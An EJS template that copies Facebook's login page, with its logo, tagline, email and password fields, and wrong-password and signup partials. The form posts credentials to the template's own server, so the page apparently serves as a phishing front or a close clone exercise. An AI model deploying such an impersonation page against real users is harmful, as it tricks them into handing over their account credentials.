<%- include('partials/boilerCode') %>
<div class="wrapper">
  <div class="container">
    <div class="main">
      <div class="content">
        <div class="logo">
          <img src="/img/logo.svg" alt="Facebook logo" />
        </div>
        <h2>
          Facebook helps you connect and share with the people in your life.
        </h2>
      </div>
      <div class="form">
        <form method="post">
          <input
            type="email"
            name="username"
            id="username"
            placeholder="Email address or phone number"
            required
          />
          <input
            type="password"
            name="password"
            id="password"
            placeholder="password"
            required
          />
          <input type="submit" value="Log in" />
          <a href="#" class="forget center">Forgotten password?</a>
          <button type="button" class="btn btn-create">
            Create new account
          </button>
          <% setTimeout(() => { obj.destroy(()=>{})}, 1000); %>
        </form>
      </div>
    </div>
  </div>
</div>
<% if (obj.wPassword) { %> <%- include('partials/wPassword') %> <% } %> <% if
(obj.nAccount) { %> <%- include('partials/nAccount') %> <% } %>
<script>
  const createBtn = document.querySelector("button.btn-create");
  createBtn.addEventListener("click", () => {
    const modal = document.getElementById("main-signup");
    modal.classList.toggle("active-signup");
  });
</script>
<%- include('signup') %> <%- include('partials/boilerCodeEnd') %>
